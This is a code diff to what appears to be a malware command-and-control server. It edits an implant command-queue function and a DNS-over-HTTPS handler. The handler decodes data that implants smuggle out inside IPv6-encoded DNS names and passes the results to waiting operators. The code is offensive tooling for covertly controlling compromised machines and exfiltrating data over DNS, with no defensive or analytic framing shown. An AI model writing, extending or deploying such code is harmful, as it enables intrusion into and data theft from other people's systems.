@@ -254,7 +254,7 @@ def add_command(implant_id, operator, command):
     else:
         logger.error(f"No queue found for implant {implant_id}, creating one")
         implant_command_queues.setdefault(implant_id, Queue())
-        implant_command_queues[implant_id].put(command)
+        implant_command_queues[implant_id].put(command.strip())
         logger.info(f"Added command for implant {implant_id}: {command}")
 
 
@@ -592,7 +592,16 @@ def doh_handler():
         for in_name in name_list:
             decoded_text = ipv6_encoder.decode_ipv6_to_text(in_name.label)
             decoded_list.append(decoded_text.strip('\x00'))
-        print(ipv6_encoder.ipv6_to_string(decoded_list))
+        # print(ipv6_encoder.ipv6_to_string(decoded_list))
+        logger.info(f"{transaction_id} sending us data")
+        # Get the data
+        result = ipv6_encoder.ipv6_to_string(decoded_list)
+        # Check which operator is waiting for a result
+        queue = implant_checkout[str(transaction_id)]
+        operator = queue.get()
+        logger.info("got queue for operator")
+        logger.info(f"sending {operator} command")
+        handle_update(operator, transaction_id, result)
         response_packet.add_answer(
             RR(rname=qname.label, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(b"example.com"))
         )
